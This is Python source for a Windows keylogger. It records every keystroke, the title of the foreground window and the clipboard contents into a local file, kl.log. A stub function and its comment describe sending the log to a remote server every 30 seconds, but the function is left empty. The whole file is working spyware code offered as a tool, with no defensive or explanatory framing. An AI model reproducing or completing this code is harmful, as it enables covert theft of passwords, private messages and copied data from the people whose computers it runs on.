from keyboard import on_press, on_release
from time import sleep
from win32gui import GetWindowText, GetForegroundWindow
from pyperclip import paste as clipboard
from multiprocessing import Process, Queue, freeze_support, Lock
from psutil import pid_exists, Process as pid

# utf8 encoding enabler
import sys
reload(sys)
sys.setdefaultencoding('utf8')
# ----------------------

prev_key = u''

text_input_queue = Queue()


def observe_context(mutex, parent_id):
    old_window = u''
    while True:
        sleep(0.8)
        try:
            if GetWindowText(GetForegroundWindow()) not in old_window:
                old_window = u'\nWindow : '+GetWindowText(GetForegroundWindow())+u'\n'
                write_log(old_window, mutex)
        except:
            pass
        if not pid_exists(parent_id):
            pid.kill()


def observe_clipboard(mutex, parent_id):
    clip = u''
    while True:
        sleep(2)
        try:
            if clipboard() not in clip:
                clip = u'\nClip : '+clipboard()+u'\n'
                write_log(clip, mutex)
        except:
            pass
        if not pid_exists(parent_id):
            pid.kill()


def write_log(text, mutex):
    if text:
        mutex.acquire()
        with open("kl.log", "a+") as f:
            f.write(text)
        mutex.release()


def text_checker_dump(queue, mutex, parent_id):
    text_input = u''
    while True:
        while not queue.empty():
            text_input += queue.get()
        sleep(1)
        if text_input:
            write_log(text_input, mutex)
            text_input = u''
        if not pid_exists(parent_id):
            pid.kill()


def mapper(key):
    global prev_key
    if "shift" in key:
        if key in prev_key:
            prev_key = key
            return ''
        else:
            prev_key = key
            return "<shift>"
    elif "ctrl" in key:
        if key in prev_key:
            prev_key = key
            return ''
        else:
            prev_key = key
            return "<ctrl>"
    elif "backspace" in key:
        return "<backspace>"
    elif "space" in key:
        return " "
    elif "enter" in key:
        return "\n"
    elif "caps lock" in key:
        return "<CAPS>"
    elif "tab" in key:
        return "<tab>"
    elif "up" in key:
        return "<up>"
    elif "down" in key:
        return "<down>"
    elif "left" in key:
        return "<left>"
    elif "right" in key:
        return "<right>"
    else:
        return key


def release_mapper(key):
    global prev_key
    prev_key = ''
    if "shift" in key:
        return "</shift>"
    elif "ctrl" in key:
        return "</ctrl>"
    else:
        return ''


def key_pressed(key_event):
    keyname = mapper(key_event.name)
    text_input_queue.put(keyname)


def key_released(key_event):
    keyname = release_mapper(key_event.name)
    text_input_queue.put(keyname)


def send_to_server(mutex, parent_id):
    #create transport and send data from log every 30s
    pass


if __name__ == '__main__':
    freeze_support()

    parent_pid = pid().pid

    on_press(key_pressed)
    on_release(key_released)

    mutex_for_file = Lock()
    input_dump = Process(target=text_checker_dump, args=(text_input_queue, mutex_for_file, parent_pid))
    input_dump.start()

    window_title = Process(target=observe_context, args=(mutex_for_file, parent_pid))
    window_title.start()

    clipboard_data = Process(target=observe_clipboard, args=(mutex_for_file, parent_pid))
    clipboard_data.start()

    while True:
        sleep(5)
